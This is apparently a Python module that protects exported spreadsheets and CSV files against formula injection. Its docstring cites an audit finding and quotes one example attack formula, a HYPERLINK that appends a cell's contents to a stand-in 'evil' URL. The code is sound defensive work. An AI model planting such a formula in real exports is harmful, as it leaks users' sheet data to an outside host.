"""
Keep spreadsheets we hand out from running anything.

Found in the 30 Sep 2026 security audit (M2): a vendor named
=HYPERLINK("http://evil…"&B2, "Click") became a live formula in the
requisition export the moment Finance opened it. Names, descriptions and
payee lists are typed by staff and vendors, so anything we write into a
sheet must arrive as text.

Two tools, because the formats differ:

* harden_workbook(wb) — call just before wb.save(). Every cell openpyxl would
  store as a formula is stored as plain text instead, so Excel shows it and
  never evaluates it. A formula we put there on purpose (a SUM row) is added
  AFTER hardening.

* csv_text(value) — for text fields in CSV files, which Excel and Google
  Sheets evaluate on open. A value starting with = + - @ tab or CR gets a
  leading apostrophe (the OWASP-recommended neutraliser). Only for TEXT:
  amounts like "-1,000.00" must reach QuickBooks untouched; a value that
  is a plain number is left alone for that reason.
"""
from __future__ import annotations

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _is_number(s: str) -> bool:
    try:
        float(s.replace(",", ""))
        return True
    except ValueError:
        return False


def csv_text(value) -> str:
    s = "" if value is None else str(value)
    if s.startswith(_TRIGGERS) and not _is_number(s.strip()):
        return "'" + s
    return s


def harden_workbook(wb) -> int:
    """Turn every formula cell into text. Returns how many were changed."""
    changed = 0
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                if cell.data_type == "f" or (isinstance(cell.value, str) and cell.value.startswith("=")):
                    cell.data_type = "s"
                    changed += 1
    return changed
